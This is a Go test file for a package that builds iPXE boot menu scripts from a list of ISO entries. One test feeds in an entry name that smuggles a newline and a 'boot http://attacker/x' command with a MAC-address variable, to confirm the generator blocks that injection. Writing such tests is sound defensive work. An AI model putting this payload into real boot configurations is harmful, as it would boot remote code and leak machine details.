package menu

import (
	"strings"
	"testing"
)

func TestEveryEntryGetsAnItemAndASectionThatFailsToTheMessage(t *testing.T) {
	script := Script("Gola Bootlace", []Entry{
		{Name: "Ubuntu 24.04 Desktop", Commands: []string{"kernel http://s/k", "boot"}},
		{Name: "Windows 11", Commands: []string{"echo windows"}},
	})
	for _, want := range []string{
		"#!ipxe\n", "menu Gola Bootlace\n", "item e0-ubuntu-24-04-desktop Ubuntu 24.04 Desktop\n", "item e1-windows-11 Windows 11\n",
		":e0-ubuntu-24-04-desktop\nkernel http://s/k || goto failed\nboot || goto failed\ngoto failed\n",
		":failed\n", "choose --default ${menu-default} selected || goto shell\n", ":shell\nshell\n",
	} {
		if !strings.Contains(script, want) {
			t.Errorf("the script lacks %q:\n%s", want, script)
		}
	}
}

func TestAnEmptyFolderStillGivesAUsableMenu(t *testing.T) {
	script := Script("Gola Bootlace", nil)
	if !strings.Contains(script, "No ISO files were found") || !strings.Contains(script, "item shell") {
		t.Errorf("empty menu:\n%s", script)
	}
}

func TestStrangeNamesCannotInjectCommands(t *testing.T) {
	script := Script("t", []Entry{{Name: "evil\nboot http://attacker/x ${net0/mac}", Commands: []string{"echo ok"}}})
	for _, line := range strings.Split(script, "\n") {
		if strings.HasPrefix(line, "boot http://attacker") {
			t.Fatalf("a name started its own command line: %q", line)
		}
	}
	if strings.Contains(script, "${net0/mac}") && strings.Contains(strings.Split(script, "item e0")[1], "${net0") {
		t.Error("a name must not expand iPXE variables")
	}
}

func TestLabelsAreUniqueEvenForTheSameName(t *testing.T) {
	script := Script("t", []Entry{{Name: "Same"}, {Name: "Same"}})
	if strings.Count(script, ":e0-same\n") != 1 || strings.Count(script, ":e1-same\n") != 1 {
		t.Errorf("labels:\n%s", script)
	}
}
